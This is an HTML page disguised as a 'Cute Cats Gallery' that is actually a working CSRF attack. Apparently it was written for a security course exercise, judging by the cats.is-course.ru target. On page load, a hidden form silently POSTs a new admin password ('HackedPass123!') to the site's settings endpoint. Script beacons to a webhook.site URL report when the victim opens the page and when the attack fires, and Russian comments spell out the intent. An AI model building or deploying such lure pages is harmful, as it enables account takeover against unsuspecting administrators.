<!DOCTYPE html>
<html>
<head>
    <title>Cute Cats Gallery 🐱</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        h1 {
            font-size: 3em;
        }
        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <h1>🐱 Amazing Cats Gallery! 🐱</h1>
    <p>Loading the most adorable cats on the internet...</p>
    <div class="loader"></div>
    
    <!-- Скрытая форма для CSRF атаки -->
    <form id="csrfForm" method="POST" action="https://cats.is-course.ru/settings" style="display:none;">
        <input type="hidden" name="password" value="HackedPass123!">
        <input type="hidden" name="confirm-password" value="HackedPass123!">
    </form>

    <script>
        // Уведомляем себя, что админ открыл страницу
        fetch('https://webhook.site/085235bc-365b-4996-baf3-4dac185f1080?event=page_opened&time=' + new Date().toISOString())
            .catch(err => console.log('Webhook notification failed'));
        
        // Ждём 1 секунду и отправляем форму смены пароля
        setTimeout(() => {
            // Уведомляем о начале атаки
            fetch('https://webhook.site/085235bc-365b-4996-baf3-4dac185f1080?event=form_submitting&time=' + new Date().toISOString())
                .catch(err => console.log('Webhook notification failed'));
            
            // Отправляем форму для смены пароля админа
            document.getElementById('csrfForm').submit();
        }, 1000);
    </script>
</body>
</html>
